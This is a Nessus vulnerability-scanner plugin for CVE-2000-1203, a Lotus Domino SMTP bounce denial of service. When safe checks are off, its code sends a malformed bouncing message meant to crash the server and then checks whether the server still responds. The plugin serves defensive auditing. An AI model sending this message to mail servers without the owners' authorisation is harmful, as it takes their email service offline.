#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL...
#
# References
# Date:  Mon, 20 Aug 2001 21:19:32 +0000
# From: "Ian Gulliver" <ian@orbz.org>
# To: bugtraq@securityfocus.com
# Subject: Lotus Domino DoS
#

if(description)
{
 script_id(11717);
 script_bugtraq_id(3212);
 script_cve_id("CVE-2000-1203");
 
 script_version ("$Revision: 1.6 $");
 name["english"] = "Lotus Domino SMTP bounce DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote SMTP server (maybe a Lotus Domino) can be killed 
or disabled by a malformed message that bounces to himself.
The routing loop exhausts all resources.

A cracker may use this to crash it continuously.

Solution: Reconfigure your MTA or upgrade it

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Broken message bounced to himself exhausts MTA";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 # Avoid this test if the server relays e-mails.
 script_dependencie("find_service.nes", "smtp_settings.nasl",
	"smtp_relay.nasl", "smtpscan.nasl");
 script_exclude_keys("SMTP/spam");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if (!port) port = 25;
buff = get_smtp_banner(port:port);

if ( ! buff || "Lotus Domino" >!< buff ) exit(0);

# Disable the test if the server relays e-mails or if safe checks
# are enabled
if (get_kb_item("SMTP/spam") || safe_checks())
{
  if(egrep(pattern:"^220.*Lotus Domino Release ([0-4]\.|5\.0\.[0-8][^0-9])", string:buff))
  {
   security_hole(port);
   exit(0);
  }
  
  # Use smtpscan's banner.
  banner = get_kb_item(string("smtp/", port, "/real_banner"));
  if(ereg(pattern:"Lotus.* ([0-4]\.|5\.0\.[0-8][^0-9])", string:banner)) {
  	security_hole(port);
   	exit(0);
   }
  exit(0);
}

#
n_sent = 0;

fromaddr = string("bounce", rand(), "@[127.0.0.1]");
toaddr = string("nessus", rand(), "@invalid", rand(), ".net");


 s = open_sock_tcp(port);
 if(!s)exit(0);
  
  
buff = smtp_recv_banner(socket:s);

b = string("From: nessus\r\nTo: postmaster\r\n",
	"Subject: SMTP bounce denial of service\r\n\r\ntest\r\n");

n = smtp_send_port(port: port, from: fromaddr, to: toaddr, body: b);
if (! n) exit(0);
sleep(1);

flag = 1;
soc = open_sock_tcp(port);
if (soc)
{
  send(socket: soc, data: string("HELO example.com\r\n"));
  buff = recv_line(socket: soc, length: 2048);
  if (buff =~ "^2[0-9][0-9] ")
    flag = 0;
  send(socket: soc, data: string("QUIT\r\n"));
  close(soc);
}
if (flag) security_hole(port);
